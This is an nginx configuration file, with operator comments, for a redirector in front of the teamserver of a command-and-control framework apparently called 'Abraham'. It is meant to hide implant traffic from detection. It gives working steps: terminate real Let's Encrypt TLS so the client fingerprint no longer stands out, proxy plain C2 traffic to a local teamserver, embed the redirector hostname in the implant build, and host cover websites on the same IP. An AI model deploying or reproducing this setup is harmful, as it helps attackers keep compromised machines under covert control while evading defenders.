# Abraham redirector front (ABR-T023 deployment pattern).
#
# The rustls ClientHello has a stable fingerprint that contradicts a
# Chrome User-Agent, and a self-signed leaf is an immediate IOC. This
# front terminates REAL TLS (Let's Encrypt or org PKI) on 443 and
# proxies plain HTTP to the teamserver running with `--plain-c2`.
# End-to-end authenticity is unchanged: the inner Ed25519 handshake +
# AES-GCM framing never trusted the outer certificate anyway, and the
# implant's optional --tls-pin now pins the redirector's real leaf.
#
# Place under /etc/nginx/conf.d/ on the redirector host, then run the
# teamserver on the same host (or a private hop) with:
#   abraham-server --listen 127.0.0.1:9443 --mgmt 127.0.0.1:9200 --plain-c2
# and embed `c2.example.com:443` in the implant build (ABRAHAM_EMBED).

server {
    listen 443 ssl;
    listen [::]:443 ssl;
    http2 on;
    server_name c2.example.com;

    ssl_certificate     /etc/letsencrypt/live/c2.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;
    ssl_protocols       TLSv1.2 TLSv1.3;

    # Only the malleable-profile URIs exist on this front; everything
    # else 404s like a real web property would.
    location / {
        proxy_pass http://127.0.0.1:9443;
        proxy_http_version 1.1;
        proxy_set_header Connection "";
        proxy_read_timeout 300s;
        proxy_send_timeout 300s;
    }
}

# Operational notes:
# - The outer fingerprint is now nginx/OpenSSL behind a real cert; the
#   UA-vs-JA3 contradiction is gone.
# - TLS between redirector and teamserver is intentionally absent:
#   they share a host/private network and the inner channel is already
#   authenticated+encrypted (see docs/protocol.md section 4).
# - Keep the profile's `server_header` consistent with what a real
#   nginx would answer (`nginx`) — it already is by default.
# - Cover content: put an ordinary website on the other server_names of
#   the same host so the IP hosts more than one vhost.
